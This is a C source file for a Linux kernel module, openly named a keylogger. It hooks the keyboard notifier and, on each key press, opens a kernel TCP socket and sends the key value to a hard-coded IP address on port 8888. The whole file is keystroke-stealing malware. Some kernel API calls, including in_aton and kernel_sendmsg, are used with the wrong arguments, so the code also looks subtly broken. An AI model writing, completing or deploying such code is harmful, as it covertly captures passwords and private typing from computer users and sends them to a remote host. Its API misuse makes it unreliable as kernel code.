#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/socket.h>

#define DEST_IP "172.20.18.47" // Destination IP address
#define DEST_PORT 8888         // Destination port number

static struct socket *sock = NULL;

static int keyboard_notifier(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    struct socket *conn_sock;
    struct sockaddr_in serv_addr;
    char key = param->value;
    int ret;

    // Ignore key releases
    if (!(param->down))
        return NOTIFY_OK;

    // Create a socket
    ret = sock_create_kern(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to create socket\n");
        return NOTIFY_OK;
    }

    // Set up server address
    memset(&serv_addr, 0, sizeof(struct sockaddr_in));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(DEST_PORT);
    ret = in_aton(DEST_IP, &serv_addr.sin_addr);
    if (ret < 0)
    {
        printk(KERN_ERR "Invalid destination IP address\n");
        goto out;
    }

    // Connect to the server
    ret = conn_sock->ops->connect(conn_sock, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in), 0);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to connect to the server\n");
        goto out;
    }

    // Send the key press
    ret = kernel_sendmsg(conn_sock, &key, sizeof(char), NULL, 0);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to send key press\n");
        goto out;
    }

out:
    sock_release(conn_sock);
    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keyboard_notifier,
};

static int __init keylogger_init(void)
{
    int ret;

    // Register the keyboard notifier
    ret = register_keyboard_notifier(&nb);
    if (ret < 0)
    {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return ret;
    }

    printk(KERN_INFO "Keylogger module initialized\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&nb);

    printk(KERN_INFO "Keylogger module exited\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Keylogger kernel module");
